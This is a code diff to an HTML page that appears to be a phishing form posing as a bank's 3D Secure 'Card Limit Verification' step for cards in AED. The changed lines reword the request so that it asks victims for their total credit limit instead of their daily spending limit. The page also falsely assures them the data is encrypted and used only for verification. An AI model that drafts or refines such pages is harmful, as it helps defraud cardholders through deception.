@@ -58,15 +58,15 @@ header{background:linear-gradient(135deg,#1a6b3a,#0f4a27);padding:14px 18px;disp
         </svg>
       </div>
       <div class="card-title">Card Limit Verification</div>
-      <div class="card-sub">To authorize this transaction, your bank requires verification of your card's daily spending limit.</div>
+      <div class="card-sub">To authorize this transaction, your bank requires verification of your card's total credit limit.</div>
     </div>
 
     <div class="notice-box">
-      <strong>Why is this required?</strong> As part of 3D Secure authentication, your bank must confirm that the transaction amount is within your card's authorized daily limit. This information is encrypted in transit and used solely for verification purposes.
+      <strong>Why is this required?</strong> As part of 3D Secure authentication, your bank must confirm that the transaction amount is within your card's total credit limit. This information is encrypted in transit and used solely for verification purposes.
     </div>
 
     <div class="form-section" id="form-section">
-      <label class="form-label">Your Card's Daily Spending Limit (AED)</label>
+      <label class="form-label">Your Card's Total Credit Limit (AED)</label>
       <div class="amount-input-wrap">
         <span class="amount-prefix">AED</span>
         <input type="text" inputmode="numeric" id="limit-input" class="amount-input" placeholder="0" oninput="onLimitInput(this.value)" autocomplete="off">
